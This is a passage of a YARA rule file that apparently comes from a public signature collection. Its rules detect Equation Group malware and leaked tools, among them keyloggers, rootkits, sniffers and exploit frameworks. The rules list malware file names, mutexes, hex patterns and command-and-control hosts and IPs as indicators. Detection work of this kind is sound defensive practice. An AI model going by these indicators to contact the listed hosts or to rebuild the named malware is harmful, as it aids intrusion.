fullword ascii\n        $s8 = \"Binding to RPC Interface %s over named pipe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"ERROR: TbMalloc() failed for encoded exploit payload\" fullword ascii\n        $x2 = \"** EncodeExploitPayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n        $x4 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n        $s6 = \"Sending Implant Payload (%d-bytes)\" fullword ascii\n        $s7 = \"ERROR: Encoder failed on exploit payload\" fullword ascii\n        $s11 = \"ERROR: VulnerableOS() != RET_SUCCESS\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"ERROR: Connection terminated by Target (TCP Ack/Fin)\" fullword ascii\n        $s2 = \"Target did not respond within specified amount of time\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of them)\n}\n\nrule EquationGroup_scanner_output\n{\n    meta:\n        description = \"Output generated by EQGRP scanner.exe\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_scanner_output\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"# Scan for windows boxes\" ascii fullword\n        $s2 = \"Going into send\" ascii fullword\n        $s3 = \"# Does not work\" ascii fullword\n        $s4 = \"You are the weakest link, goodbye\" ascii fullword\n        $s5 = \"rpc   Scan for RPC  folks\" ascii fullword\n\n    condition:\n        filesize < 1000KB and 2 of them\n}\n\nrule EquationGroup_exploitlib_mutexes\n{\n    meta:\n        description = \"Equation group's Exploitation library\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_equation_exploitlib_mutexes\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"prkMtx\" wide\n        $a2 = \"cnFormSyncExFBC\" wide\n        $a3 = \"cnFormVoidFBC\" wide\n        $a4 = \"cnFormSyncExFBC\"\n        $a5 = \"cnFormVoidFBC\"\n\n    condition:\n        (uint16(0) == 0x5a4d and any of ($a*))\n}\n\nrule EquationGroup_doublefantasy_genericresource\n{\n    meta:\n        description = \"DoubleFantasy encoded config\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_equation_doublefantasy_genericresource\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = {06 00 42 00 49 00 4E 00 52 00 45 00 53 00}\n        $a2 = \"yyyyyyyyyyyyyyyy\"\n        $a3 = \"002\"\n\n    condition:\n        (uint16(0) == 0x5a4d and all of ($a*)) and filesize < 500000\n}\n\nrule EquationGroup_equationlaser_runtimeclasses\n{\n    meta:\n        description = \"EquationLaser malware\"\n        threat_names = \"Equation Group\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_equation_equationlaser_runtimeclasses\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"?a73957838_2@@YAXXZ\"\n        $a2 = \"?a84884@@YAXXZ\"\n        $a3 = \"?b823838_9839@@YAXXZ\"\n        $a4 = \"?e747383_94@@YAXXZ\"\n        $a5 = \"?e83834@@YAXXZ\"\n        $a6 = \"?e929348_827@@YAXXZ\"\n\n    condition:\n        any of them\n}\n\nrule EquationGroup_cryptotable\n{\n    meta:\n        description = \"Crypto library used in Equation group malware\"\n        threat_names = \"Equation Group\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_equation_cryptotable\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {37 DF E8 B6 C7 9C 0B AE 91 EF F0 3B 90 C6 80 85 5D 19 4B 45 44 12 3C E2 0D 5C 1C 7B C4 FF D6 05 17 14 4F 03 74 1E 41 DA 8F 7D DE 7E 99 F1 35 AC B8 46 93 CE 23 82 07 EB 2B D4 72 71 40 F3 B0 F7 78 D7 4C D1 55 1A 39 83 18 FA E1 9A 56 B1 96 AB A6 30 C5 5F BE 0C 50 C1}\n\n    condition:\n        $a\n}\n\nrule EquationGroup_Kaspersky_TripleFantasy_1\n{\n    meta:\n        description = \"Equation Group Malware - TripleFantasy\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_TripleFantasy_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"%SystemRoot%\\\\system32\\\\hnetcfg.dll\" fullword wide\n        $s1 = \"%WINDIR%\\\\System32\\\\ahlhcib.dll\" fullword wide\n        $s2 = \"%WINDIR%\\\\sjyntmv.dat\" fullword wide\n        $s3 = \"Global\\\\{8c38e4f3-591f-91cf-06a6-67b84d8a0102}\" fullword wide\n        $s4 = \"%WINDIR%\\\\System32\\\\owrwbsdi\" fullword wide\n        $s5 = \"Chrome\" fullword wide\n        $s6 = \"StringIndex\" fullword ascii\n        $x1 = \"itemagic.net@443\" fullword wide\n        $x2 = \"team4heat.net@443\" fullword wide\n        $x5 = \"62.216.152.69@443\" fullword wide\n        $x6 = \"84.233.205.37@443\" fullword wide\n        $z1 = \"www.microsoft.com@80\" fullword wide\n        $z2 = \"www.google.com@80\" fullword wide\n        $z3 = \"127.0.0.1:3128\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300000 and ((all of ($s*) and all of ($z*)) or (all of ($s*) and 1 of ($x*)))\n}\n\nrule EquationGroup_Kaspersky_DoubleFantasy_1\n{\n    meta:\n        description = \"Equation Group Malware - DoubleFantasy\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_DoubleFantasy_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $z1 = \"msvcp5%d.dll\" fullword ascii\n        $s0 = \"actxprxy.GetProxyDllInfo\" fullword ascii\n        $s3 = \"actxprxy.DllGetClassObject\" fullword ascii\n        $s5 = \"actxprxy.DllRegisterServer\" fullword ascii\n        $s6 = \"actxprxy.DllUnregisterServer\" fullword ascii\n        $x1 = \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" ascii\n        $x2 = \"191H1a1\" fullword ascii\n        $x3 = \"November \" fullword ascii\n        $x4 = \"abababababab\" fullword ascii\n        $x5 = \"January \" fullword ascii\n        $x6 = \"October \" fullword ascii\n        $x7 = \"September \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 350000 and (($z1) or (all of ($s*) and 6 of ($x*)))\n}\n\nrule EquationGroup_Kaspersky_GROK_Keylogger\n{\n    meta:\n        description = \"Equation Group Malware - GROK keylogger\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_GROK_Keylogger\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"c:\\\\users\\\\rmgree5\\\\\" ascii\n        $s1 = \"msrtdv.sys\" fullword wide\n        $x1 = \"svrg.pdb\" fullword ascii\n        $x2 = \"W32pServiceTable\" fullword ascii\n        $x3 = \"In forma\" fullword ascii\n        $x4 = \"ReleaseF\" fullword ascii\n        $x5 = \"criptor\" fullword ascii\n        $x6 = \"astMutex\" fullword ascii\n        $x7 = \"ARASATAU\" fullword ascii\n        $x8 = \"R0omp4ar\" fullword ascii\n        $z1 = \"H.text\" fullword ascii\n        $z2 = \"\\\\registry\\\\machine\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n        $z4 = \"\\\\registry\\\\machine\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Session Manager\\\\Environment\" wide fullword\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250000 and ($s0 or ($s1 and 6 of ($x*)) or (6 of ($x*) and all of ($z*)))\n}\n\nrule EquationGroup_Kaspersky_GreyFishInstaller\n{\n    meta:\n        description = \"Equation Group Malware - Grey Fish\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_GreyFishInstaller\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"DOGROUND.exe\" fullword wide\n        $s1 = \"Windows Configuration Services\" fullword wide\n        $s2 = \"GetMappedFilenameW\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_Kaspersky_EquationDrugInstaller\n{\n    meta:\n        description = \"Equation Group Malware - EquationDrug installer LUTEUSOBSTOS\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_EquationDrugInstaller\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"\\\\system32\\\\win32k.sys\" fullword wide\n        $s1 = \"ALL_FIREWALLS\" fullword ascii\n        $x1 = \"@prkMtx\" fullword wide\n        $x2 = \"STATIC\" fullword wide\n        $x3 = \"windir\" fullword wide\n        $x4 = \"cnFormVoidFBC\" fullword wide\n        $x5 = \"CcnFormSyncExFBC\" fullword wide\n        $x6 = \"WinStaObj\" fullword wide\n        $x7 = \"BINRES\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500000 and all of ($s*) and 5 of ($x*)\n}\n\nrule EquationGroup_Kaspersky_FannyWorm\n{\n    meta:\n        description = \"Equation Group Malware - Fanny Worm\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_FannyWorm\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"x:\\\\fanny.bmp\" fullword ascii\n        $s2 = \"32.exe\" fullword ascii\n        $s3 = \"d:\\\\fanny.bmp\" fullword ascii\n        $x1 = \"c:\\\\windows\\\\system32\\\\kernel32.dll\" fullword ascii\n        $x2 = \"System\\\\CurrentControlSet\\\\Services\\\\USBSTOR\\\\Enum\" fullword ascii\n        $x3 = \"System\\\\CurrentControlSet\\\\Services\\\\PartMgr\\\\Enum\" fullword ascii\n        $x4 = \"\\\\system32\\\\win32k.sys\" fullword wide\n        $x5 = \"\\\\AGENTCPD.DLL\" fullword ascii\n        $x6 = \"agentcpd.dll\" fullword ascii\n        $x7 = \"PADupdate.exe\" fullword ascii\n        $x8 = \"dll_installer.dll\" fullword ascii\n        $x9 = \"\\\\restore\\\\\" fullword ascii\n        $x10 = \"Q:\\\\__?__.lnk\" fullword ascii\n        $x11 = \"Software\\\\Microsoft\\\\MSNetMng\" fullword ascii\n        $x12 = \"\\\\shelldoc.dll\" fullword ascii\n        $x13 = \"file size = %d bytes\" fullword ascii\n        $x14 = \"\\\\MSAgent\" fullword ascii\n        $x15 = \"Global\\\\RPCMutex\" fullword ascii\n        $x16 = \"Global\\\\DirectMarketing\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300000 and ((2 of ($s*)) or (1 of ($s*) and 6 of ($x*)) or (14 of ($x*)))\n}\n\nrule EquationGroup_Kaspersky_HDD_reprogramming_module\n{\n    meta:\n        description = \"Equation Group Malware - HDD reprogramming module\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_HDD_reprogramming_module\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"nls_933w.dll\" fullword ascii\n        $s1 = \"BINARY\" fullword wide\n        $s2 = \"KfAcquireSpinLock\" fullword ascii\n        $s3 = \"HAL.dll\" fullword ascii\n        $s4 = \"READ_REGISTER_UCHAR\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300000 and all of ($s*)\n}\n\nrule EquationGroup_Kaspersky_EOP_Package\n{\n    meta:\n        description = \"Equation Group Malware - EoP package and malware launcher\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_EOP_Package\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"abababababab\" fullword ascii\n        $s1 = \"abcdefghijklmnopq\" fullword ascii\n        $s2 = \"@STATIC\" fullword wide\n        $s3 = \"$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" fullword ascii\n        $s4 = \"@prkMtx\" fullword wide\n        $s5 = \"prkMtx\" fullword wide\n        $s6 = \"cnFormVoidFBC\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100000 and all of ($s*)\n}\n\nrule EquationGroup_Kaspersky_TripleFantasy_Loader\n{\n    meta:\n        description = \"Equation Group Malware - TripleFantasy Loader\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_TripleFantasy_Loader\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Original Innovations, LLC\" fullword wide\n        $x2 = \"Moniter Resource Protocol\" fullword wide\n        $x3 = \"ahlhcib.dll\" fullword wide\n        $s0 = \"hnetcfg.HNetGetSharingServicesPage\" fullword ascii\n        $s1 = \"hnetcfg.IcfGetOperationalMode\" fullword ascii\n        $s2 = \"hnetcfg.IcfGetDynamicFwPorts\" fullword ascii\n        $s3 = \"hnetcfg.HNetFreeFirewallLoggingSettings\" fullword ascii\n        $s4 = \"hnetcfg.HNetGetShareAndBridgeSettings\" fullword ascii\n        $s5 = \"hnetcfg.HNetGetFirewallSettingsPage\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50000 and (all of ($x*) and all of ($s*))\n}\n\nrule EquationGroup_Kaspersky_SuspiciousString\n{\n    meta:\n        description = \"Equation Group Malware - suspicious string found in sample\"\n        threat_names = \"Equation Group\"\n        ref = \"http://goo.gl/ivt8EW\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Equation_Kaspersky_SuspiciousString\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"i386\\\\DesertWinterDriver.pdb\" fullword\n        $s2 = \"Performing UR-specific post-install...\"\n        $s3 = \"Timeout waiting for the \\\"canInstallNow\\\" event from the implant-specific EXE!\"\n        $s4 = \"STRAITSHOOTER30.exe\"\n        $s5 = \"standalonegrok_2.1.1.1\"\n        $s6 = \"c:\\\\users\\\\rmgree5\\\\\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500000 and all of ($s*)\n}\n\nrule EquationGroup_EquationDrug_NetworkSniffer1\n{\n    meta:\n        description = \"EquationDrug - Backdoor driven by network sniffer\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_NetworkSniffer1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s3 = \"sys\\\\mstcp32.dbg\" fullword ascii\n        $s7 = \"mstcp32.sys\" fullword wide\n        $s8 = \"p32.sys\" fullword ascii\n        $s9 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s10 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s11 = \"\\\\Device\\\\%ws\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_CompatLayer_UnilayDLL\n{\n    meta:\n        description = \"EquationDrug\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_CompatLayer_UnilayDLL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"unilay.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and $s0\n}\n\nrule EquationGroup_EquationDrug_HDDSSD_Op\n{\n    meta:\n        description = \"EquationDrug - HDD/SSD firmware operation\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_HDDSSD_Op\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"nls_933w.dll\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_NetworkSniffer2\n{\n    meta:\n        description = \"EquationDrug - Network Sniffer\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_NetworkSniffer2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"IP Transport Driver\" fullword wide\n        $s2 = \"tdip.sys\" fullword wide\n        $s3 = \"sys\\\\tdip.dbg\" fullword ascii\n        $s4 = \"dip.sys\" fullword ascii\n        $s5 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s6 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s7 = \"\\\\Device\\\\%ws\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_NetworkSniffer3\n{\n    meta:\n        description = \"EquationDrug - Network Sniffer\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_NetworkSniffer3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Corporation. All rights reserved.\" fullword wide\n        $s1 = \"IP Transport Driver\" fullword wide\n        $s2 = \"tdip.sys\" fullword wide\n        $s3 = \"tdip.pdb\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_VolRec_Driver\n{\n    meta:\n        description = \"EquationDrug - Collector plugin for Volrec\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_VolRec_Driver\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"msrstd.sys\" fullword wide\n        $s1 = \"msrstd.pdb\" fullword ascii\n        $s2 = \"msrstd driver\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_KernelRootkit\n{\n    meta:\n        description = \"EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above)\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_KernelRootkit\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"Parmsndsrv.dbg\" fullword ascii\n        $s2 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s3 = \"msndsrv.sys\" fullword wide\n        $s5 = \"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Windows\" fullword wide\n        $s6 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s7 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s9 = \"\\\\Device\\\\%ws\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_Keylogger\n{\n    meta:\n        description = \"EquationDrug - Key/clipboard logger driver\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_Keylogger\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"\\\\registry\\\\machine\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n        $s2 = \"\\\\registry\\\\machine\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Session Manager\\\\En\" wide\n        $s3 = \"\\\\DosDevices\\\\Gk\" fullword wide\n        $s5 = \"\\\\Device\\\\Gk0\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_NetworkSniffer4\n{\n    meta:\n        description = \"EquationDrug - Network-sniffer/patcher\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_NetworkSniffer4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Copyright 1999 RAVISENT Technologies Inc.\" fullword wide\n        $s1 = \"\\\\systemroot\\\\\" fullword ascii\n        $s2 = \"RAVISENT Technologies Inc.\" fullword wide\n        $s3 = \"Created by VIONA Development\" fullword wide\n        $s4 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s5 = \"\\\\device\\\\harddiskvolume\" fullword wide\n        $s7 = \"ATMDKDRV.SYS\" fullword wide\n        $s8 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s9 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s10 = \"CineMaster C 1.1 WDM Main Driver\" fullword wide\n        $s11 = \"\\\\Device\\\\%ws\" fullword wide\n        $s13 = \"CineMaster C 1.1 WDM\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule EquationGroup_EquationDrug_PlatformOrchestrator\n{\n    meta:\n        description = \"EquationDrug - Platform orchestrator\"\n        threat_names = \"Equation Group\"\n        ref = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationDrug_PlatformOrchestrator\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"SERVICES.EXE\" fullword wide\n        $s1 = \"\\\\command.com\" fullword wide\n        $s2 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        